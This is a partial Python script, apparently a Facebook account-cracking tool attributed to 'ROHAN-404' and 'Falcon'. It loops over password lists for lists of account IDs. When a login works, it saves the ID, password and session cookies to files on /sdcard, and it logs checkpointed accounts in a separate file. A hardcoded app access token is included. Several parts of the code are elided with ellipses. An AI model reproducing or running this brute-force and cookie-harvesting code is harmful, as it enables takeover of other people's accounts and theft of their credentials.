...
logo = (f"""
      ...
      {W}┗┛┛┗┗┛V{G}/{W}FC
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{vb} DEVELOPER {vcv} ROHAN{G}-{W}404
...
#-_-_-_-_-_-_-_-<-FILE-MENU->-_-_-_-_-_-_-_-#
    def _F_i_L_e_(self):
    	clear()
    	print(f"{vb} EXAMPLE   {vcv}{G} /{W}sdcard{G}/{W}EHC{G}.{W}txt ")
    	linex()
    	...
    	print(f"{vb} TOTAL CP-LOCK/CP-LOCK-LOGING {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
...
#-_-_-_-_-_-_-_-<-FILE-M1->-_-_-_-_-_-_-_-#
    def _M_1_X_(self,ids,names,passlist):
    	try:
    	    ...
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}EHC-F1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ...
                    print(f"\r\r{vb}{G}/{W}>{B}Falcon-CP-LOCK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}CCP-LOCKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/CF-BY-Falcon-FILE-M1-CP-LOCK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}FALCON-CP-LOCK-LOGING{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/EHC-BY-FALCON-FILE-M1-CP-LOCK-LOGING.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
...
#-_-_-_-_-_-_-_-<-FILE-M2->-_-_-_-_-_-_-_-#
    def _M_2_X_(self,ids,names,passlist):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}EHC-F2{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ...
                    print(f"{vb}{G}/{W}>{B}CCP-LOCKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/CF-BY-FALCON-FILE-M2-CP-LOCK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}FALCON-CP-LOCK-LOGING{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/CF-BY-FALCON-FILE-M2-CP-LOCK-LOGING.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
...
#-_-_-_-_-_-_-_-<-RANDOM-M1->-_-_-_-_-_-_-_-#
    def _M_1_(self,ids,passlist):
    	...
    	sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}CF-R1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
